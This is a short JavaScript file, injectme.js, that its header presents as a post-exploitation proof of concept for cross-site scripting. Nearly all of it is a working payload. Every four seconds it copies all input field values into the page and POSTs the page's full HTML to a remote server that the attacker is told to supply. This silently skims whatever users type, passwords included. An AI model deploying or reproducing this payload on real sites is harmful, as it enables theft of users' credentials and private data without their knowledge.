/* injectme-js
   Created By: Matthew Fuller - matthewdfuller.com
   Description: injectme.js is a post-exploitation script loaded on a remote page susceptible to
   cross-site scripting. It is designed as a proof-of-concept for easily demonstrating the effects
   of cross-site scripting vulnerabilities. Instead of loading a standard XSS alert popup, use this
   script to show that user data can be captured without any notice to the user and sent back to a
   remote server which you own.
   License: This script is released as-is, free and open-source. You can modify it as needed.
*/

// User variables
var remote_post = "post.php"; //Provide your server's full path to POST page here

//Call every couple seconds
window.setInterval(function(){
  makePost();
}, 4000);

function makePost() {
    var inputs = document.getElementsByTagName("input");
    for (var i=0, max=inputs.length; i < max; i++) {
         //inputs[i].setAttribute("onblur", "inputFunc(this)");
         inputs[i].setAttribute("value", inputs[i].value);
    }
    // Create JS POST Function
    var http = new XMLHttpRequest();
    var params = "data=" + document.getElementsByTagName('html')[0].innerHTML;
    http.open("POST", remote_post, true);
    
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
    
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
                //alert(http.responseText);
            }
    }
    http.send(params);
}